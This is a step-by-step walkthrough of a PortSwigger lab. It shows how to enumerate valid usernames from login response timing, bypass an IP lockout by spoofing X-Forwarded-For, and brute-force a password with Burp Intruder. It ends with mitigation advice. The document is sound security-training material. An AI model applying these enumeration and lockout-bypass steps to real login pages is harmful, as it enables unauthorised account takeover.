# 📘 PortSwigger Lab: Username Enumeration via Response Timing

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing  
> 📄 Candidate usernames: https://portswigger.net/web-security/authentication/auth-lab-usernames  
> 📄 Candidate passwords: https://portswigger.net/web-security/authentication/auth-lab-passwords  
> 🎯 Topic: Authentication vulnerabilities — Username Enumeration via Response Timing + IP lockout bypass using `X-Forwarded-For`

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [⏱ Why Response Time Leaks the Username](#timing)
- [🌐 Why X-Forwarded-For Matters](#xff)
- [🎯 Why Pitchfork Is Used](#pitchfork)
- [🔍 Step 1 — Inspect the Login Request](#step1)
- [🔍 Step 2 — Confirm the Lockout Behavior](#step2)
- [🔍 Step 3 — Bypass the Lockout with X-Forwarded-For](#step3)
- [🔍 Step 4 — Configure Intruder for Username Enumeration](#step4)
- [🔍 Step 5 — Identify the Username by Timing](#step5)
- [🔍 Step 6 — Brute-force the Password](#step6)
- [🔍 Step 7 — Log in to the Account](#step7)
- [🧩 Data Used](#payloads)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)

---

<a id="goal"></a>

## 🎯 Goal

Identify a valid username using increased server response time, brute-force this user's password, and access the account page.

The lab also provides valid test credentials:

```text
wiener:peter
```

These credentials are not the solution. They are useful as a control account for comparing how the application behaves for existing and non-existing users.

---

<a id="theory"></a>

## 🧠 Short Theory

In previous username enumeration labs, the leak was visible in the response body:

```text
Invalid username
Incorrect password
```

or in a tiny text difference:

```text
Invalid username or password.
Invalid username or password 
```

In this lab, the response text, status code, and length may look the same. The useful side channel is **response timing**.

If the username does not exist, the application may return an error immediately. If the username exists, the application performs additional password verification, for example using a slow password hashing function. This makes the response for a valid username noticeably slower.

---

<a id="idea"></a>

## 🧩 Core Idea

The attack flow:

```text
1. Confirm that repeated failed login attempts trigger a lockout.
2. Bypass the lockout using X-Forwarded-For.
3. Use a long password to amplify the timing difference.
4. Enumerate usernames and find the one that consistently responds slower.
5. Fix the identified username.
6. Brute-force the password and look for 302 Found.
7. Log in to the account.
```

---

<a id="timing"></a>

## ⏱ Why Response Time Leaks the Username

A vulnerable login flow may work like this:

```text
POST /login
    ↓
Look up the user
    ↓
If the username does not exist:
    return an error immediately
    ↓
If the username exists:
    verify the password hash
    return an error or log in
```

Simplified flow:

```text
Invalid username
    ↓
User not found
    ↓
Fast response


Valid username
    ↓
User found
    ↓
Password verification
    ↓
Slower response
```

Using a very long password can make the delay easier to detect. That is why the lab recommends a password of about 100 characters.

Example:

```http
username=testtesttest&password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

and:

```http
username=wiener&password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

The valid username usually causes a longer response time.

---

<a id="xff"></a>

## 🌐 Why X-Forwarded-For Matters

The application blocks an IP address after several failed login attempts:

```text
3 failed attempts
        ↓
IP blocked for 30 minutes
```

However, the application trusts the following header:

```http
X-Forwarded-For
```

This header is normally used by proxies to forward the original client IP address to the backend application. The vulnerability appears when the application trusts this header directly from the client.

An attacker can send:

```http
X-Forwarded-For: 1
```

```http
X-Forwarded-For: 2
```

```http
X-Forwarded-For: 3
```

The application treats these requests as if they came from different IP addresses, even though they all come from the same attacker.

---

<a id="pitchfork"></a>

## 🎯 Why Pitchfork Is Used

In Intruder, two positions must change at the same time:

```http
X-Forwarded-For: §1§
```

and:

```http
username=§candidate_username§&password=AAAAAAAA...
```

The **Pitchfork** attack type takes values from multiple payload lists in parallel:

| Request | X-Forwarded-For | Username |
|---:|---:|---|
| 1 | 1 | carlos |
| 2 | 2 | root |
| 3 | 3 | admin |
| 4 | 4 | ads |

Why not Sniper:

```text
Sniper changes only one payload position.
```

Why not Cluster Bomb:

```text
Cluster Bomb tries all combinations and creates many unnecessary requests.
```

Pitchfork is ideal here: one username gets one fresh spoofed IP value.

---

<a id="step1"></a>

## 🔍 Step 1 — Inspect the Login Request

Open the login page and submit any invalid credentials:

```text
username=test
password=test
```

In Burp Suite, find the request:

```http
POST /login
```

Example request body:

```http
username=test&password=test
```

Send the request to Repeater:

```text
Right click → Send to Repeater
```

---

<a id="step2"></a>

## 🔍 Step 2 — Confirm the Lockout Behavior

In Repeater, send a few invalid login attempts.

After several attempts, the application blocks login attempts:

```text
Too many incorrect login attempts
```

or a similar message.

In this walkthrough, the behavior was:

```text
Every 3 invalid requests triggered a lockout for approximately 30 minutes.
```

This means direct brute force is not possible.

---

<a id="step3"></a>

## 🔍 Step 3 — Bypass the Lockout with X-Forwarded-For

Add the following header:

```http
X-Forwarded-For: 1
```

Send several invalid requests.

Then change the value:

```http
X-Forwarded-For: 2
```

If the application accepts requests again, it means it uses `X-Forwarded-For` as the client IP source.

This allows Intruder to perform many requests while changing the spoofed IP value each time.

---

<a id="step4"></a>

## 🔍 Step 4 — Configure Intruder for Username Enumeration

Send the request to Intruder and select:

```text
Attack type: Pitchfork
```

Add the header:

```http
X-Forwarded-For: §1§
```

Set the username as a payload position:

```http
username=§test§&password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

The password should be long, around 100 characters, to amplify the timing difference.

Payload set 1:

```text
Numbers
From: 1
To: 100
Step: 1
Max fraction digits: 0
```

Payload set 2:

```text
Candidate usernames
https://portswigger.net/web-security/authentication/auth-lab-usernames
```

Start the attack.

---

<a id="step5"></a>

## 🔍 Step 5 — Identify the Username by Timing

After the attack finishes, enable additional columns:

```text
Columns → Response received
Columns → Response completed
```

Sort the results by response time.

Most usernames have similar response times:

```text
120 ms
140 ms
160 ms
```

One username responds significantly slower:

```text
1056 ms
```

In this walkthrough, the username was:

<details>
<summary>🔑 Show identified username</summary>

```text
ads
```

</details>

Important: one measurement is not enough. The suspicious username should be repeated several times in Repeater using a long password and different `X-Forwarded-For` values.

---

<a id="step6"></a>

## 🔍 Step 6 — Brute-force the Password

Create a new Intruder attack.

Use again:

```text
Attack type: Pitchfork
```

Add:

```http
X-Forwarded-For: §1§
```

Fix the identified username:

```http
username=ads&password=§test§
```

Payload set 1:

```text
Numbers 1-100
```

Payload set 2:

```text
Candidate passwords
https://portswigger.net/web-security/authentication/auth-lab-passwords
```

Start the attack and look for:

```http
302 Found
```

A `302` response indicates successful login and redirect to the account page.

Identified password:

<details>
<summary>🔑 Show identified password</summary>

```text
soccer
```

</details>

---

<a id="step7"></a>

## 🔍 Step 7 — Log in to the Account

Discovered credentials:

<details>
<summary>🔑 Show discovered credentials</summary>

```text
Username: ads
Password: soccer
```

</details>

If the browser is blocked because of previous invalid attempts, log in through Repeater using a fresh header value:

```http
X-Forwarded-For: 1000000
```

and send:

```http
username=ads&password=soccer
```

A successful login looks like this:

```http
HTTP/2 302 Found
Location: /my-account?id=ads
Set-Cookie: session=...
```

Then use:

```text
Follow redirection
```

Alternatively, submit the login form through the browser with Burp Intercept enabled and manually add a fresh `X-Forwarded-For` header before forwarding the request.

---

<a id="payloads"></a>

## 🧩 Data Used

Username list:

```text
https://portswigger.net/web-security/authentication/auth-lab-usernames
```

Password list:

```text
https://portswigger.net/web-security/authentication/auth-lab-passwords
```

Long password for timing testing:

```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Username enumeration request:

```http
X-Forwarded-For: §1§

username=§candidate_username§&password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Password brute-force request:

```http
X-Forwarded-For: §1§

username=ads&password=§candidate_password§
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

The lab contained two vulnerabilities.

### 1. Timing-based Username Enumeration

The application processed existing users more slowly than non-existing users.

Reason:

```text
non-existing username → fast rejection
existing username → additional password hash verification
```

This created a timing side channel.

### 2. Trusting X-Forwarded-For

Rate limiting was tied to the client IP address, but the IP address was taken from a spoofable request header:

```http
X-Forwarded-For: 12345
```

As a result, the attacker could bypass the lockout and perform many login attempts.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

Correct thought process:

```text
1. Confirm rate limiting.
2. Find a way to bypass it.
3. Check whether username affects response time.
4. Use wiener:peter as a known-good control account.
5. Use a long password to amplify the timing difference.
6. Enumerate usernames with a fresh X-Forwarded-For value for each request.
7. Find the username that consistently responds slower.
8. Fix the username and brute-force passwords.
9. Find 302 Found.
10. Stop Intruder immediately after the first 302.
```

Main takeaway:

```text
Even if the error message is identical, response time can still reveal the application's internal logic.
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### 1. Trusting a single timing measurement

Timing attacks are noisy. One slow response may be a network spike. Confirm the suspicious username several times.

### 2. Using a short password

If the password is too short, the timing difference may be too small.

### 3. Forgetting X-Forwarded-For

Without spoofing the IP address, the application quickly blocks the brute-force attempt.

### 4. Using Sniper instead of Pitchfork

Both `X-Forwarded-For` and username/password must change together.

### 5. Not enabling Response received / Response completed

Without these columns, timing analysis is harder.

### 6. Not stopping Intruder after 302

If Intruder continues after finding the correct password, it sends more invalid attempts and may trigger another lockout.

---

<a id="defense"></a>

## 🛡 Mitigation

Proper defenses:

- use the same processing path for existing and non-existing users;
- avoid leaking usernames through response timing;
- normalize response timing or add a controlled delay;
- rate-limit not only by IP, but also by username, device fingerprint, session, and behavior;
- never trust `X-Forwarded-For` directly from clients;
- accept `X-Forwarded-For` only from trusted reverse proxies;
- use MFA;
- log large-scale login attempts;
- detect abnormal numbers of different `X-Forwarded-For` values;
- block credential stuffing and password spraying patterns.

Weak defense:

```text
Identical error message but different processing time.
```

Even weaker:

```text
Rate limiting based on spoofable X-Forwarded-For values.
```

---

<a id="checklist"></a>

## ✅ Checklist

- [x] `POST /login` request found.
- [x] Lockout after several failed attempts confirmed.
- [x] `X-Forwarded-For` bypass confirmed.
- [x] Long password used for timing testing.
- [x] Intruder Pitchfork configured.
- [x] Payload 1: numbers for `X-Forwarded-For`.
- [x] Payload 2: candidate usernames.
- [x] `Response received` and `Response completed` columns enabled.
- [x] Username with increased response time identified.
- [x] Username confirmed.
- [x] Password brute-force configured.
- [x] `302 Found` response identified.
- [x] Logged in to the account.
- [x] Lab solved.

---

# ⬆ Back to Top

[Return to contents](#top)
